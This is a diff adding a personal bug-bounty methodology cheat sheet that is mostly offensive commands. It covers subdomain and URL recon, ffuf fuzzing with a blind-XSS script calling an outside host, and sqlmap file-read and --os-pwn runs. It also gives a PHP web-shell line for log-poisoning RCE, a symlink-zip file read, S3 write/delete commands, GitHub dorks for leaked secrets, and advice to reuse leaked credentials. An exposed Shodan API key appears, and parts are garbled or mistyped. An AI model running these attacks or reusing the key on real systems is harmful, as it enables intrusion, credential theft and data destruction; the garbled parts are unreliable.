@@ -1,0 +1,280 @@
+~/OneDrive/Desktop****** Methodology ******
+
+Domain & Sub-Domains :-
+
+Sublister -d domain.com -o sublister.txt
+subfinder -d domain.com -o subfinder.txt
+findomain -t example.com -u findomain.txt
+assetsfinder domain.com -subs-only >> assetfinder.txt
+amass enum -passive -norecursive -noalts -d domain.com -o amass.txt
+cat sublister.txt subfinde.txt findomain.txt assetfinder.txt amass.txt findomain.txt | sort -u >> all_domians.txt
+amass enum -passive -norecursive -noalts -df all_domians.txt -o more-all_domians.txt
+cat more-all_domians.txt | httprobe >> live_1_domains.txt
+cat more-all_domians.txt | httprobe >> live_2_domains.txt
+cat live_1_domains.txt live_2_domains.txt | sort -u all_live_domain.txt
+
+
+** need to some research on lazyshot**
+https://github.com/mdhama/lazyshot
+
+Subdomain Takeover SUBZY
+subzy --targets file.txt
+
+cat sublister.txt subfinde.txt findomain.txt assetfinder.txt amass.txt | sort -u >> all_domians.txt
+cat more-all_domians.txt | httprobe >> live_1_domains.txt
+cat more-all_domians.txt | httprobe >> live_2_domains.txt
+cat live_1_domains.txt live_2_domains.txt | sort -u all_live_domain.txt
+cat live_domains | httpx --silent | jsubfinder -s
+
+
+URLS :-
+
+waybackurls domain.com | sort -u >> url_1.txt
+gau --o url_2.txt domain.txt
+cat url_2.txt url_1.txt | sort -u >> all_urls.txt
+echo domain.com | waybackurls | grep cdn-cgi
+
+cat all_urls | gf xss, kxss, dalfox ,etc
+dalfox url.com
+echo domain.com | waybackurls | kxss
+
+Broken Link Hijacking :-
+blc -rof --filter-level 3 https://domain.com/
+
+
+Dirbuster
+
+XSSFUZZ
+
+Dirsearch
+dirsearch -u https://target.com
+
+
+FUFF :-
+ffuf -u https://domain.com/FUZZ -w "wordlist_path"
+ffuf -w host.txt -u FUZZ -H "X-Original-IP: >script src=http://yourserver.xss.ht ></script>" -mc 200
+ffuf -u "https://FUZZTARGET/FUZZ" -w live_1_domains.txt:FUZZTARGET -w /home/huzefa/Desktop/Wordlists/Orwa\ WorldList/aditya-shinde-cheatsheet.txt:FUZZ -mc 200,301,302,403,401,500 -of all 
+ffuf -u "FUZZTARGET/FUZZ" -w host.txt:FUZZTARGET -w /home/huzefa/Desktop/Wordlists/Orwa\ WorldList/aditya-shinde-cheatsheet.txt:FUZZ -mc 200,302,403,401,500 -of all
+
+Dirb :-
+dirb https://url.com/
+
+bypass-403 :-
+./bypass-403.sh https://example.com
+
+Reconftw :-
+./reconftw.sh -d target.com -r
+
+Wpscan :-
+wpscan --url "https://target.com"  --random-user-agent --api-token "your_api_token" --ignore-main-redirect
+Single Line Python Tools :-
+python3 smuggler.py -u "domain.com"   ( Http Request Smuggling )
+python3 smuggler.py -urls "domain.txthttps://www.sbiindo.com/assets/backend/"   ( Http Request Smuggling )
+subzy -target domian.com              ( Subdomain Takeover )
+python3 girdorker.py -q domain.com -d  Dork/filename -tf tokenfile.txt -o output.txt   ( Github Exposed ) ( don't know what is tokenfile.txt )
+python3 cloudfail.py --target "target.com"  ( Hidden / Origin IP's )
+python3 paramspider.py --domain hackeron
+
+Orwa Methodology :-
+
+*** Part 1 *** 
+
+1. target.com "password" search this dork.
+
+How to find bugs in small scope?
+
+For eg :-
+In scope dev.orwa.com and orwa.com
+
+Start looking for the program from all the ways starts with checking all the related Domains, and IP Even if not in scope.
+
+Why? 
+Out of scope == > to In scope.
+
+https://crt.sh
+
+When there is just an employee login page search Leak credential on github/dork etc and try to get into application.
+
+For eg.
+1. Orwa found github leak (user: & Pass) for domain notl isted in scope. He checked the same user and pass on the links & subsdomains that in scope valid login.
+
+2. Orwa found domain not listed Inscope that domain, He was able to signup as employee and I complete with  his signup with ( google, Yahoo, orwa@progamename.com ) 
+Then back to scope & he can login for domain In scope. ** Auth Bypass ** 
+
+3. Domain not listed in the Scope. After look for JS files found in JS domain from. domain that. In scope. Domain & Access Token. Full login in that panelas Admin.
+
+Note: Take a look of out of scope but don't test.
+
+*** Part 2 ***
+
+SHODAN :- 
+
+We will work on AT&T program. And take threat name. i.e. AT&T Services, Inc. → Shodan Crt sh 
+How to know if domain | sub-domains / IP belongs to this program ?
+
+→ 
+1. Check SSL certificate, subject Offer organization i.e O= 
+2. We can check IP/domain on "www.solshopper.com"
+
+Go to shodan i.e shadan.io
+
+Shodan api key :- tXKd6vZn2k1DrbXJ2RJoivo6ZWDQPQcn
+
+1. ssl "AT&T services. Inc. " * 200 
+2. filter http:title
+3. Search login page and try default credentials. 
+4. ssl.cert.subject.CN : "domain.com" 200 http: title:"login"
+5. net. <" CIDR, CIDR, CIDR">
+6. SSL 1 "program Hame" 
+7. ssl.cert.subject.CN:"domain.com" 200
+8. org:"Target" http.title:"GITLAB"
+http.title="Grafana" 200 
+http.title: "Critix gateway" 200 Cve 0day for grafana with poc.
+9. shodan download Public_IP_jsw_in_1 'ssl.cert.subject.CN:"jsw.in"'
+
+GITHUB :-
+
+1. Look for endpoints / domains / IP 
+2. Search for domain.com then use dorks  { pasword, pars, pood, secrets, user, accem taken, elc, token, private, language: bash  }
+3. Secret ==> secret access key, client_secret
+4. "domain.com" services. { ssh, sftp, ftp, proxy, vpn, vsphere, internal, siem, firewall, ..etc }
+5. "domain.com" security_credentials { LDAP (active directory) }, connectionstring { Database Credentials }, JDBC { Database Credentials }, 
+				ssh_auth_password, password= { Unauthorized access server }, send_keys /send, Keys { if other keywords related password failed }
+
+When get access-token, Response Id, etc check the date & user is working for the company or not.
+
+Alway Github filter to make Recon easy.
+for eg.
+att.com secret Not dev. att M07 about att
+i.e domain.com dork NOT name.domain.
+
+Always checks for https://gist.github.com.
+
+
+
+*** Part 3 ***
+
+SQL INJECTION :-
+
+Where we can inject ?
+Try to inject in Parameter itself 
+for eg . https://82.96.13.0.59/name.nil?Login=1 Injection ⇒ login"Inject_here"=1
+
+→ Just add Sql in URL
+eg domain.com/opp_dev.php /1* injection point.
+
+→ file upload
+Copy the POST request & save it as txt file → pass it to sqlmap.
+sqlmap -r txt.file -p para_name ( Instead of "-p para_name" just insert "*" in file where we want to inejct )
+sqlmap -u "url.com" -p parameter --level 5 --risk 3 --dbms="MySQL: --randomaagent --test-filter="boolen-based blind" --current-user --hostname
+sqlmap -r post_2.txt --level 5 --risk 3 --dbms="MariaDB: --randomaagent --batch --banner --dbs
+
+1. Parameters →
+2. In Parameter itself
+3. Ur l→ sqlmap -u "domain.com/*" 
+4. file Upload → Request → sqlmap -r filename.txt 
+
+
+*** Nuclei Tool ***
+
+
+Installation 
+
+1. nuclei.project discovery.io/nuclei/get-started/
+
+Custom Templates :- 
+nuclei -t /template/path/template_name -l  file.txt
+
+
+2. How to update nuclei?
+   nuclei -update-templates
+
+3. How to use nuclei templates?
+   nuclei -t template_name -l file.txt
+   cat file.txt / nuclei -t /path/template_folder/particular_file -o output.txt -v {  If want to scan, other wise whole folder can full scan }
+
+4. nuclei -u http://example.com -t /path/template_folder/
+5. cat file.txt | nuclei -c 100 -silent -t /path/template_folder/
+6. URL crawling github waymore
+
+
+*** AWS S3 BUCKET MISCONFIGURATION ***
+
+1. Passive Recon :-
+	i. 	Ping domain.com. → Copy IP Address
+	ii. nslookup Ipaddress
+	ii. dig domain.com → Lopy Ipaddress & Visit site
+
+2. Active Recon :-
+	i. Lazy 33 tool → ruby lazys3.rb domain.com 
+	
+3. AWS CLI :-
+	i. commands :-
+		1. aws s3 1s s3://bucket_path/ --no-signin-request --region us-west-1 { misconfiguration → Everyone can access the bucket }
+		2. aws s3 --profile default ls s3://bucket_path  { misconfiguration koi bhi authenticated ID se bucket access kar sakte hai }
+		3. aws s3 sync s3://bucket_path --no-signin-request --region us-west-1
+		4. aws s3 mv test.txt s3://bucket_path
+		5. aws s3 cp test.txt s3://bucket_path
+		6. aws s3 rm s3://bucket_path/file.txt
+	
+
+*** Microsoft IIS Testing ***
+
+1. IIS tilde directory enumeration :-
+	It allows to detect short names of files and directories in IIS app by using some vectors in several versions of Microsoft IIS.
+	Attacker can find important files and folder that are not normally visible.
+
+
+2. Next part in IIS :-
+	a. Discovering, Tools, Wordlist for fuzzing, Testing, Tips :- 
+	Nuclei Template (nuclei-template/fuzzing/iis-shortname.yaml), Wappalyzer extension, Shodan (http.title:"IIS", SSL:"company name Inc." http.title:"IIS", ssl.cert.subject.CN:"company.in" http.title:"IIS")
+	IIS Tilde Extension (Burp), shortscan tool github, jetbrain dotPeek ( to analyze files such as dll file and export the source of that files), visual studio code
+	ffuf, orwa on github wordlist
+	github dork : path:/ds_so
+	create a wordlist with ai eg:- create a large wordlist with ds_so
+	
+3. Last part in IIS :-
+	Example for Critical bugs
+	Dll file -> fuzz it eg UTILFUZZ.dll -> valid endpoint UTILies.dll -> send it to jetbrains dotpeek -> export project -> start source code review -> aws credentials
+
+
+*** Response Manipulation ***
+
+1. Authentication Bypass :-
+
+2. Permissions: Edit, ADD, Del,etc.. :-
+
+3. Prices and Currency :-
+
+********** NahamSec Course Notes **********
+
+SQL Injection :-
+Use Atlas tool and Iql burp extension to detect qraphql vulnerabilities/valid request.
+Use viewdns for origin ips
+Use qaz.wtf for encoding
+Use sqlmap to escalte the bug:-
+sqlmap -u --file-read "/etc/passwd"
+--os-pwn
+%BF
+%ff
+%00
+
+
+XXE :-
+Where to find?
+XML Post Data, Json post data using content type coverter extension in burpsuite, Any input that accept Xml data.
+Exploit { SSRF, LFI, RCE }
+To construct image payload need to use hex-editor ghex to edit
+
+
+RCE :-
+Rce via lfi
+Get request /<?php phpinfo(); ?> or <?php system($_GET['cmd']);> 
+url=file:///var/log/apache2/access.log&contentType=application/x-php  or url=file:///var/log/apache2/access.log&contentType=application/x-php&cmd=
+symlinks leads to rce :-
+ln -s /etc/passwd link
+zip --symlinks test.zip link
+upload test.zip on the server
+the response to post request will have etc/passwd file
+
+
